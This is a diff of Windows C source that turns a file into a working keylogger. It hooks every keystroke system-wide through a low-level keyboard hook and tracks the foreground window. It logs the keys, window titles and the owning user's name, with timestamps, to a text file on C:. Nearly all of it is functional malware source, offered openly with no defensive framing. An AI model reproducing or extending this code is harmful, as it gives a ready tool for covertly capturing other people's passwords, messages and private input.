@@ -1,19 +1,35 @@
-#include "winkey.h"
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <winuser.h>
+#include <tlhelp32.h>
+#include <Strsafe.h>
+#include <stdlib.h>
+#include <locale.h>
+#include <wingdi.h>
+#define REEF(x){ if (x){ free(x); x = NULL;}}
+#define CHAR_MODE 1
+#define WCHAR_MODE 2
+HHOOK winHook;
+HWND gh_hwndMain;
+BOOL foregroundWindowChanged;
+char foregroundWindowTitle[4096];
 
-extern BOOL foregroundWindowChanged;
-extern char foregroundWindowTitle[4096];
+VOID log(void *toLog, int MODE, BOOL putDate)
+{
+    FILE *f = fopen("C:\\keylogger_log.txt", "a+");
+    if (putDate)
+    {
+        SYSTEMTIME lt;    
+        GetLocalTime(&lt);
+        fprintf(f, "\n[%02d/%02d/%d %02d:%02d:%02d]", lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond);
+    }
+    if (MODE == CHAR_MODE)
+        fprintf(f, "%s", (LPSTR)toLog);
+    else if (MODE == WCHAR_MODE)
+        fprintf(f, "%ws", (WCHAR *)toLog);
+    fclose(f);
+}
 
-/**
- * This function prints text representation of a virtual key, according to a mode.
- * If the mode is 0, it prints vKey like Ctrl, Alt etc. without printing vKey representation
- * of printable vkey (ie "A", "*" and so on).
- * 
- * If the mode is 1, it also prints the printable characters, normally because a sequence initiated by a [CTRL] vkey
- * or an ALT vkey was began.
- * 
- * Thanks to this, we can log [CTRL]+[S] instead of [CTRL] and nothing, or a strange char code outputed by
- * the infamous UnicodeEx function.
- */
 VOID LogvKey(INT vKey, INT MODE)
 {
     if (MODE == 0)
@@ -886,15 +902,95 @@ VOID GetWindowTitle(HWND hwnd)
     if (hwnd == NULL)
     {
         strcpy_s(foregroundWindowTitle, 4096, "[GetWinTitle Failed]");
-        log(foregroundWindowTitle, CHAR_MODE, TRUE);
         return;
     }
     int windowTitleLen = GetWindowTextLength(hwnd);
     if (windowTitleLen > 4095)
         windowTitleLen = 4095;
     GetWindowTextA(hwnd, foregroundWindowTitle, windowTitleLen + 1);
-    log(foregroundWindowTitle, CHAR_MODE, TRUE);
-    if (!strlen(foregroundWindowTitle))
-        log("NO WINDOW", CHAR_MODE, TRUE);
     foregroundWindowChanged = TRUE;
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode != HC_ACTION ||( wParam != WM_KEYDOWN &&  wParam != WM_SYSKEYDOWN && wParam != WM_SYSKEYUP && wParam != WM_KEYUP))  // do not process message if nCode < 0
+        return CallNextHookEx(winHook, nCode, wParam, lParam); 
+    PKBDLLHOOKSTRUCT keyInfos = (PKBDLLHOOKSTRUCT)lParam;// struct qui contient les informations concernant la frappe.
+    HWND foregroundWindow =  GetForegroundWindow();
+    DWORD foregroundWindowPID;
+    DWORD foregroundWindowTID = GetWindowThreadProcessId(foregroundWindow, &foregroundWindowPID);
+    WCHAR keyByte[5] = {0};//for unicode we may need more than 1 byte
+    BYTE keyState[256] = {0};
+    HKL keyboardLayout = GetKeyboardLayout(foregroundWindowTID);
+    INT res = 0;
+    char foregroundWindowUsername[4096];
+
+    if (foregroundWindowChanged)
+    {
+        foregroundWindowChanged = FALSE;
+        SYSTEMTIME lt;    
+        GetLocalTime(&lt);
+        GetUsernameOfForegroundWindow(foregroundWindowUsername, foregroundWindowPID);
+        size_t sz = strlen("[Foreground window's user : %s][Foreground window's title : %s]\n") + strlen(foregroundWindowTitle) + strlen(foregroundWindowUsername + 1);
+        LPSTR toLog = malloc(sizeof(char) * sz);
+        if (toLog == NULL)
+            log("\n[malloc for loggin failed]\n", CHAR_MODE, TRUE);
+        else
+        {
+            sprintf_s(toLog, sz, "[Foreground window's user : %s][Foreground window's title : %s]\n", foregroundWindowUsername,  foregroundWindowTitle);
+            log(toLog, CHAR_MODE, TRUE);
+            REEF(toLog);
+        }
+    }
+    // We need to set ourself the keyState because we are in KEYBOARD_LL mode which capture keys BEFORE the target thread receive the key
+    // GetKeyBoardState do not work because it gets the state after us, not in the same time. There is no GetAsyncKeyboardState unfortunatly.
+    for (int i = 0; i != 256; i++)
+    {
+        if (GetAsyncKeyState(i) & 0x8000)
+            keyState[i] = 0x80; 
+        else if (GetAsyncKeyState(i) & 0x1)
+            keyState[i] = 0x1;
+    }
+    if (wParam != WM_KEYUP)
+        LogvKey(keyInfos->vkCode, 0);
+    if (keyState[VK_CONTROL] != 0X80 && keyState[VK_MENU] != 0X80)
+        res = ToUnicodeEx(keyInfos->vkCode, keyInfos->scanCode, keyState, (LPWSTR)&keyByte, 4, 0x4, keyboardLayout);
+    else if ((keyState[VK_CONTROL] == 0X80 || keyState[VK_MENU] == 0X80) && wParam != WM_KEYUP)
+        LogvKey(keyInfos->vkCode, 1);
+    if (res > 0 && wParam != WM_KEYUP)
+        log(keyByte, WCHAR_MODE, FALSE);
+    fflush(NULL);
+    return CallNextHookEx(winHook, nCode, wParam, lParam);
+}
+
+VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
+{
+    (void)hWinEventHook;
+    (void)event;
+    (void)idObject;
+    (void)idChild;
+    (void)idEventThread;
+    (void)dwmsEventTime;
+    GetWindowTitle(hwnd);
+}
+
+int main(void)
+{
+    winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+    HWINEVENTHOOK winEvt = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
+    foregroundWindowChanged = TRUE;
+    GetWindowTitle(GetForegroundWindow());
+    if (winHook == NULL || winEvt == NULL)
+        exit(1);
+    MSG msg;
+    while(1)
+    {
+        if (GetMessage(&msg, NULL, 0, 0))
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+    }
+    UnhookWindowsHookEx(winHook);
+    UnhookWinEvent(winEvt);
 }
